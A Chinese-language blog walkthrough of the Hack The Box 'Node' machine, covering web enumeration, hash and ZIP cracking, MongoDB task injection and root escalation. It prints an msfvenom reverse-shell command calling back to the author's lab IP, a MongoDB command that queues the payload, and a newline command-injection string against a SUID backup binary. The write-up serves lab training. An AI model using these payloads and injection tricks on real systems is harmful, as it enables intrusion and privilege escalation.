> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/LbD2bB8EBq5Q9NRJlK5DIQ)

一个每日分享渗透小技巧的公众号![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCWsznInTj3b9TFYtTDIYG6lDGJZYYSv72NsVWF24Kjlo4MT29tEOQSg/640?wx_fmt=png)

  

  

大家好，这里是 **大余安全** 的第 **117** 篇文章，本公众号会每日分享攻防渗透技术给大家。

![](https://mmbiz.qpic.cn/mmbiz_png/9qXnTkZPuxe8H1QicBcbrQQVKOeKw2PsaPtbkhed7icVWmmGk0o3VgYFqKdtNwPFicT2aW803Yp7DqjdiaoFRYVX3A/640?wx_fmt=png)

靶机地址：https://www.hackthebox.eu/home/machines/profile/110

靶机难度：中级（4.3/10）

靶机发布日期：2017 年 10 月 24 日

靶机描述：

Node focuses mainly on newer software and poor configurations. The machine starts out seemingly easy, but gets progressively harder as more access is gained. In-depth enumeration is required at several steps to be able to progress further into the machine.

请注意：对于所有这些计算机，我是通过平台授权允许情况进行渗透的。我将使用 Kali Linux 作为解决该 HTB 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。

![](https://mmbiz.qpic.cn/mmbiz_png/gUVKXuw5icTuicMe1TSd3CYPJzxFcxUnzpBLmOY2lYosbSmH5Ro01bJbqOVUwZ97d098kTPyiaWWicblornticcLu9w/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/0fb0Y1M6icJJia7t9xsBuUuxZQgOLeWHYicicRpfEiahMz3mlpK0icx8qLpfMLDojhD7IwSE2IalXVBBFs9E1Z88Ka3Q/640?wx_fmt=png)

一、信息收集

![](https://mmbiz.qpic.cn/mmbiz_png/PRVgXdHra5CzBfuOaOX4dpiaoOia6WZfdos1RiaJEZJG7nrnxTkXBoianpRmkQTmqkmW3zkbaQqjAu6WwBYAmyGibiaQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOZx9HJjh0suYick2lXiclZcm2L9MSJ905bofJyKwstebwXaqAk6ghnnMJvBMuSwOiaMmrVkhc12CL0Q/640?wx_fmt=png)

可以看到靶机的 IP 是 10.10.10.58....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOZx9HJjh0suYick2lXiclZcmnH43hicpHVXIUR7hwHiaeuPmyAbAHqQVibIwl8U8RhCwt5Dib21Y457IlA/640?wx_fmt=png)

nmap 仅发现开放了 OpenSSH 和 Node.js....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOZx9HJjh0suYick2lXiclZcmUKcX3rXaAwtqpM9Dm0uzBBKhbIJF9ibMI5ya7TzoH4e8fxZmEG2wPSw/640?wx_fmt=png)

访问 web 发现存在个登陆界面 login....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOZx9HJjh0suYick2lXiclZcm3A1kTibCpzmU6ZrnlxeOUdSnNSE45T9XhSyicUzXHDz9LXzdDDBIFxaQ/640?wx_fmt=png)

丢着爆破，刚开始就报断点错误，根据做 vulnhub 靶机经验，这是半张笑脸.... 后面继续爆破就没任何目录信息....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOZx9HJjh0suYick2lXiclZcmiaMOPRyENXAQicx6qvdOcC92ibEAgZUW4xcUBOETgqByCFdVP5Z9LpL4w/640?wx_fmt=png)

查看前端代码，很多 js 文件... 都查看了一番

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOZx9HJjh0suYick2lXiclZcmxT6cyHnkdTiaiaFjN6snfE59iaSBEg73KKB0YOmOwfztO2TXo5chtoyibg/640?wx_fmt=png)

发现存在 / api/users/latest 信息目录...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOZx9HJjh0suYick2lXiclZcmonaZH1micVotjlWw3uk0PlKiaibA7GM0yJkfZxPpVDpPibtohia0icXibRFGQ/640?wx_fmt=png)

进入去掉 latest，获得了 0 类的密匙信息....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOZx9HJjh0suYick2lXiclZcm9GXGiaEXrsoPjF3a6J2yuXUDLib0WtursIvDfpyRcptiadApg9kzYQx6g/640?wx_fmt=png)

通过爆破哈希值，获得了密码... 这里测试了四个，只有 0 类可以登陆 web....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOZx9HJjh0suYick2lXiclZcmWrJEw5Yhm8bbffaZ2LTGfuB0ORkjZ2icMEFNLMswmkTSSh9IUbIEzww/640?wx_fmt=png)

登陆即可....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOZx9HJjh0suYick2lXiclZcmrnPmjib2VgE4ibLQNP3qDQQAhSLTfXQzTG2ErwsU8zScZLFTJ4SPdAvg/640?wx_fmt=png)

进入后 download 文件... 直接下载是无法下载的一直循环下载....

这里需要开启本地代理进行下载....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOZx9HJjh0suYick2lXiclZcmCYqcf8Pk06SdD6ibibznyPIMdtMlicEyUUfmpBsquFpgWQmhU0O06jfjA/640?wx_fmt=png)

下载完后读取发现是 base64 值，解码后读取文件类型，可看到是 ZIP 压缩文件...

解压提示需要密码...

这里直接利用 fcrackzip 暴力破解 zip 类型文件密码..

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOZx9HJjh0suYick2lXiclZcmmCQyYczKnyic9mQe9DDIIbwamdLlnVdu0pWZ4LBX7KYibou0hpLO8gNg/640?wx_fmt=png)

成功获得了密码...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOZx9HJjh0suYick2lXiclZcmiblTBkQQS86rjK2qnXRoPvFTsQpHuUPouob8dydia7trWaXiaocX0qR7w/640?wx_fmt=png)

解压后，在目录底层继续查看了 jx 文件内容...

发现了两个信息，mark 用户名密码和 backup_key....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOZx9HJjh0suYick2lXiclZcmXMg36picx5OwCxkCZ96HKAgPx0A4QHWC3Z1zmnSc6weyeyQD7az0BVA/640?wx_fmt=png)

利用 mark 用户名密码成功 ssh 登陆到靶机...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOZx9HJjh0suYick2lXiclZcmFfa9rWmhdpFstYpyROpb51E4M4I1dibb1aUy7GjP2qtNl7Wofe2yepA/640?wx_fmt=png)

这里存在三个用户 mark、frank、tom，直接列举了 tom 存在运行的进程... 又是 app.js

查看发现它访问了 mongodb 数据库，并执行了任务表中放置的所有任务，可看到 setInterval 函数，该函数可以在 cmd 值下执行任何操作...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOZx9HJjh0suYick2lXiclZcmI1dUrS8wXeBd9TEp3eD8Y2wOCBRdb4vrLq8P7ibk2KO2S7b4L4Uhu1w/640?wx_fmt=png)

```
sudo msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.51 LPORT=6666 -f elf -o dayushell.elf
```

利用 MSF 制作 shell... 然后 scp 上传...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOZx9HJjh0suYick2lXiclZcm8a7UtV2ugF0TfxcHicFv7yiaRb4Eehz4ZwkLGibz58E6ZWoZ5miccT4Ydw/640?wx_fmt=png)

```
mongo -u mark -p 5AYRft73VtFpc84k localhost:27017/scheduler
```

```
use scheduler
show collections
db.tasks.insertOne({cmd:'/tmp/dayushell.elf'})
```

登录到 mongodb，并使用语法插入要执行的有效负载...

过 1 分钟左右获得了反向外壳....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOZx9HJjh0suYick2lXiclZcmAFnldkAEwwP3rrqK3HxLx2jBGLb3sdbAydFmDr6QLkrKzAPsvMJ4hQ/640?wx_fmt=png)

上传 LinEnum.sh 枚举，枚举 SUID 时，发现了 backup 二进制文件... 和 app.js 内看到的 backup_key 感觉是相匹配的信息...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOZx9HJjh0suYick2lXiclZcmwj0dt6AJCHQib63FMVbEITYPzFgRTugYjXdiaJT2xgpSrelEyd22mCIg/640?wx_fmt=png)

将 backup 下载到本地...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOZx9HJjh0suYick2lXiclZcmC8IXFCahu6a28uyCcwOsJGHT6jFWC9Qhic9mzF0jdCSeLcBSEIBLeWQ/640?wx_fmt=png)

通过 IDA 查看发现，二进制文件的 main 函数检查有 3 个，如果返回 false，它将跳转到左侧的块以完全退出...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOZx9HJjh0suYick2lXiclZcmcAWaJc2BNtibtvBhRjg46awyJBAG3cAZy4GfKdqI9PqrcHMkT0xEe7A/640?wx_fmt=png)

测试给了它 3 个论点，输出了内容....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOZx9HJjh0suYick2lXiclZcmFBXw1S0CQVcJtUAVAdd9Jqic8THHnmgunohvLEbCnK2Suk5XpzPec4w/640?wx_fmt=png)

```
strace ./backup 1 2 3
```

利用 strace 调用跟踪程序走向信息... 可以看到程序正在尝试读取 / etc/myplace/keys 中的内容，去看看....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOZx9HJjh0suYick2lXiclZcmK5ibfamvY8Qja6cUjicDkWKlfXEibywtSIofK1OLjtVzYqcWI9jnr3d8w/640?wx_fmt=png)

三个密匙....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOZx9HJjh0suYick2lXiclZcmCfxpPibyc5Xn5sMWfTZ79icuLnMibnSgicnvWvTNXGJGMa9gm0nllgSAtA/640?wx_fmt=png)

返回查看 backup_key，和前面 keys 对比，发现第一个密匙凭证一样的... 果然是有关联的...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOZx9HJjh0suYick2lXiclZcmSXb4k3eThibAO4p0WWFbF63uyuibnJ3s5ycEQwuLz4CG24Vziajw7qbWw/640?wx_fmt=png)

```
ltrace /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /tmp/a
```

利用 ltrace 继续进行探测... 这里科普下哈：

strace------ 跟踪进程的系统调用或信号产生的情况

ltrace------- 跟踪进程调用库函数的情况

可以看到该目录使用 magicword 作为密码进行了压缩，然后该 zip 文件已进行 base64 编码，另外注意到有许多使用 strchr（）或 strstr（）的过滤器，这里可以绕过他们提权...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KOZx9HJjh0suYick2lXiclZcmicXKqEARIsWXEeEBLWicSp5t9VtIQndLK2d6rtsjNFQFYwDJq86skJLA/640?wx_fmt=png)

```
./backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 "$(printf '\n/bin/sh\necho OK')"
```

利用 $（），printf 和换行符的组合来注入命令成功获得了 root 权限，并获得了 user_flag 和 root_flag 信息...

![](https://mmbiz.qpic.cn/mmbiz_png/9qXnTkZPuxe8H1QicBcbrQQVKOeKw2PsaPtbkhed7icVWmmGk0o3VgYFqKdtNwPFicT2aW803Yp7DqjdiaoFRYVX3A/640?wx_fmt=png)

这里 backup 还可以利用缓冲区溢出，或者我也提示了 base64 和 magicword 密码，可以直接提取 root_base64 值，然后获得 root_flag....

web 信息收集 + hash 爆破 + ZIP 爆破 + mongodb 数据库分析提权 + 信息枚举 + backup 二进制解析提权

由于我们已经成功得到 root 权限查看 user 和 root.txt，因此完成这台中级的靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。

如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。

![](https://mmbiz.qpic.cn/mmbiz_png/gUVKXuw5icTuicMe1TSd3CYPJzxFcxUnzpBLmOY2lYosbSmH5Ro01bJbqOVUwZ97d098kTPyiaWWicblornticcLu9w/640?wx_fmt=png)

如果觉得这篇文章对你有帮助，可以转发到朋友圈，谢谢小伙伴~

![](https://mmbiz.qpic.cn/mmbiz_png/c5xrRn4430AnqkfAJc38Vpnc5XiaADLTjiciciaibYU4EHw3Nuh7YMtuB0hz3sb8Em9iatt5skAsibuuysPLdLY5LtWOw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/p3lIbvldZiabdI5iaCb3icRhtygUuo2sp6Hcdq0ANlpy5W3gL628uq032jsoVnGnl6HdGrgDXjfazFtkp6IInibDdQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvSIFX0iaPcG00CjYIwQDwIDeIicmFMlOVNyhWYVSE8pJK566UK3YOUNWQ/640?wx_fmt=png)

随缘收徒中~~ **随缘收徒中~~** **随缘收徒中~~**

欢迎加入渗透学习交流群，想入群的小伙伴们加我微信，共同进步共同成长！

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

大余安全

一个全栈渗透小技巧的公众号

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCSsnsc7MHh257oYRic1MOT8qibABNUEnTq9DUL7QBwnS52EheJf4m8iaTQ/640?wx_fmt=png)